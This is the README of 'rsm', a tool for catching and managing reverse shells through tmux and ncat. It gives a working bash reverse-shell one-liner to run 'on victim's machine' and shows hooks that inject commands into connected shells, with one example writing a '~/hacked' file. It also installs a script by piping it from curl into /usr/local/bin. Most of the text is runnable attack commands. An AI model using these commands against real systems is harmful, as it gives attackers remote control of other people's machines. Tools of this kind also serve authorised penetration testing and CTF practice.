# rsm

A simple reverse shell manager using `tmux` and `ncat`.

## Install

```shell
curl https://raw.githubusercontent.com/djosix/rsm/master/rsm > /usr/local/bin/rsm
```

## Quick Start

Listening on a port and attach to the session. (rsm creates a separated tmux socket, so it will not mess up your tmux sessions)

```shell
rsm 14641
```

On victim's machine, launch a reverse shell. Once the victim connects back, rsm will create a tmux window handling the TCP connection. The only thing you need to do is switching to that window in the rsm tmux session.

```shell
bash -c 'bash -i >& /dev/tcp/127.0.0.1/14641 0<&1'
```

If a rsm session is detached, you can attach to it using this:

```shell
rsm attach
```

Stop the server and cleanup. If no port is specified, rsm will stop all listening sessions.

```shell
rsm stop [port1] [port2] [...]
```

## Settings

Hooking the client connection, you can use `$IP` and `$PORT` in your command, which correspond to the client:

```shell
export RSM_HOOK='echo Hello, you are $IP:$PORT'
rsm d 12345

nc 127.0.0.1 12345
```

Client gets:

```
Hello, you are 127.0.0.1:50522
```

Injecting command to the reverse shell. (stdout of the hook command will be sent to the client socket, stderr will be printed out)

```shell
export RSM_HOOK='echo "echo hehe > ~/hacked"'
rsm d 12345

bash -c 'bash -i >& /dev/tcp/127.0.0.1/12345 0<&1'
cat ~/hacked # hehe
```

Executing a command when rsm starts:

```shell
export RSM_WITH='ncat -lk 12345 -c "cat > test.txt"'
rsm d 22222
```

Other settings:

```shell
export RSM_DIR=$HOME/.rsm   # where rsm sockets will be
export RSM_MAX_CONN=32      # maximum number of connections
export RSM_MAX_RECV=32      # maximum receiving mega-bytes
rsm 13370
```

## Usage

```shell
$ rsm help
Usage:

    rsm PORT            Start a reverse shell listener on PORT
    rsm d[etached] PORT Start a detached reverse shell listener on PORT
    rsm l[ist]          List active rsm listeners
    rsm i[nfo] PORT     Show details of listener on PORT
    rsm i[nfo]          Show details of all rsm listeners
    rsm s[top] PORT     Stop a rsm listener on PORT
    rsm s[top]          Stop all rsm listeners
    rsm a[ttach] PORT   Attach to a rsm session listening on PORT
    rsm a[ttach]        Attach to the last rsm session
    rsm c[lean] PORT    Clean sockets for PORT
    rsm c[lean]         Clean all sockets
    rsm h[elp]          Show this help message

    Configurable Variables:

        RSM_DIR         Where the rsm sockets be stored (default: /tmp/.rsm)
        RSM_MAX_CONN    Maximum number of connections (default: 128)
        RSM_MAX_RECV    Maximum receiving MB (default: 64)
        RSM_HOOK        Command to eval when a client connects
        RSM_WITH        Command to eval when rsm starts

```
